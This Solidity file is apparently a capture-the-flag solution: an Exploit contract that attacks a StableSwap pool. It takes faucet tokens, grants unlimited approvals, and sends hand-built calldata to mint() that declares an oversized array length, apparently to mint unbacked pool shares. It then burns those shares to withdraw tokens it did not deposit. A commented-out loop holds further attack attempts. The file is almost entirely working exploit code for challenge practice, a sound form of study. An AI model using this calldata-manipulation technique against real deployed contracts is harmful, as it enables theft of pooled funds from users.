pragma solidity ^0.8.11;
import {ERC20PresetFixedSupply} from "@openzeppelin/contracts/token/ERC20/presets/ERC20PresetFixedSupply.sol";
interface IStableSwap {
    function burn(uint256 amount) external;
    function mint(uint256[] memory amounts) external returns (uint256);
    function swap(address src, uint256 srcAmt, address dst) external;
    function balances(address) external returns (uint256);
    function donate(uint256 amount) external;
}

interface ISetup {
    function faucet(uint256 amount) external;
    function USDC() external returns (address);
    function BUSD() external returns (address);
    function USDT() external returns (address);
    function isSolved() external view returns (bool);
}

contract Exploit {
    IStableSwap stable_swap;
    ERC20PresetFixedSupply public USDC;
    ERC20PresetFixedSupply public USDT;
    ERC20PresetFixedSupply public BUSD;

    constructor(IStableSwap _stable_swap, ISetup setup) {
        stable_swap = _stable_swap;

        // setup
        setup.faucet(1000);
        USDC = ERC20PresetFixedSupply(setup.USDC());
        USDT = ERC20PresetFixedSupply(setup.USDT());
        BUSD = ERC20PresetFixedSupply(setup.BUSD());

        USDC.approve(address(stable_swap), type(uint256).max);
        USDT.approve(address(stable_swap), type(uint256).max);
        BUSD.approve(address(stable_swap), type(uint256).max);

        bytes memory data = abi.encodeWithSelector(stable_swap.mint.selector, 0x20, 3618502788666131106986593281521497120414687020801267626233049500247285301248);
        (bool success,) = address(stable_swap).call(data);
        require(success, "oops");
        stable_swap.burn(stable_swap.balances(address(this)));

        // attack
        // for (uint i; i < 10; i++) {
        //     print();
        //     mint();
        //     print();
        //     uint x = stable_swap.balances(address(this));
        //     uint y = stable_swap.balances(address(this)) - x;
        //     stable_swap.burn(x);
        //     stable_swap.burn(y);
        //     print();

        //     // uint amount = BUSD.balanceOf(address(address(this)));
        //     // stable_swap.swap(address(BUSD), amount, address(USDC));
        //     // print();

        //     if (setup.isSolved()) {
        //         break;
        //     }
        // }
    }

    function print() public {
        uint swap_c = USDC.balanceOf(address(stable_swap));
        uint swap_t = USDT.balanceOf(address(stable_swap));
        uint swap_b = BUSD.balanceOf(address(stable_swap));
        uint user_c = USDC.balanceOf(address(this));
        uint user_t = USDT.balanceOf(address(this));
        uint user_b = BUSD.balanceOf(address(this));
    }

    function mint() public {
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = USDC.balanceOf(address(this));
        amounts[1] = USDT.balanceOf(address(this));
        amounts[2] = 0;//BUSD.balanceOf(address(this));
        stable_swap.mint(amounts);
    }
}